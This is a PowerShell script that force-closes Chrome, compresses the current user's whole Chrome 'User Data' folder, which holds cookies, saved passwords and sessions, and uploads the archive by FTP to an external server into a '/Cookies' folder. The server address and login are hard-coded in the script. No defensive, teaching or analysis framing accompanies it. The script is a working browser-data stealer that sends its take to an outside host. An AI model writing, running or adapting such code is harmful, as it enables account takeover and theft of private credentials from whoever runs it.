# Close Chrome before running the script
try {
    Stop-Process -Name "chrome" -Force -ErrorAction Stop
    Write-Host "Chrome has been closed."
} catch {
    Write-Host "Chrome was not running."
}

# FTP server details
$FTP_HOST = "us-east-1.sftpcloud.io"
$FTP_USERNAME = "d45b8e2d698147e59f2234fd87b98082"
$FTP_PASSWORD = 'CHbEN9bcriLn1f8X5pBzc66ZZsgrIa3p'

# Resolve the %USERNAME% environment variable correctly in PowerShell
$userName = $env:USERNAME

# Directory to work with, correctly replacing %USERNAME% with actual username
$user_data_directory = "C:\Users\$USERNAME\AppData\Local\Google\Chrome\User Data"

# Path for the ZIP file in the C: drive
$zipFilePath = "C:\ChromeUserData_$USERNAME.zip"

# Check if User Data directory exists and compress it into a ZIP file
if (Test-Path $user_data_directory) {
    Compress-Archive -Path $user_data_directory -DestinationPath $zipFilePath -Force
    Write-Host "User Data directory has been compressed to ZIP."
} else {
    Write-Host "User Data directory does not exist."
    exit
}

# FTP function to upload ZIP file
function Upload-ToFtp {
    param (
        [String]$file_path,
        [String]$file_name
    )
    # Load Assembly and create FTPWebRequest to /Cookies directory (using /Cookies for historical reasons, can be adjusted)
    $ftpUrl = "ftp://$FTP_HOST/Cookies/$file_name"
    Add-Type -AssemblyName System.Net
    $ftpRequest = [System.Net.FtpWebRequest]::Create($ftpUrl)
    $ftpRequest.Credentials = New-Object System.Net.NetworkCredential($FTP_USERNAME, $FTP_PASSWORD)
    $ftpRequest.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
    $ftpRequest.UseBinary = $true
    $ftpRequest.KeepAlive = $false

    # Read file content
    $content = [System.IO.File]::ReadAllBytes($file_path)
    $ftpRequest.ContentLength = $content.Length

    # Get request stream and upload the file
    $requestStream = $ftpRequest.GetRequestStream()
    $requestStream.Write($content, 0, $content.Length)
    $requestStream.Close()

    Write-Host "Uploaded $file_name to FTP in /Cookies."
}

# Upload the ZIP file
$file_name = [System.IO.Path]::GetFileName($zipFilePath)
Upload-ToFtp -file_path $zipFilePath -file_name $file_name

# Clean up the ZIP file if necessary (optional)
# Remove-Item -Path $zipFilePath
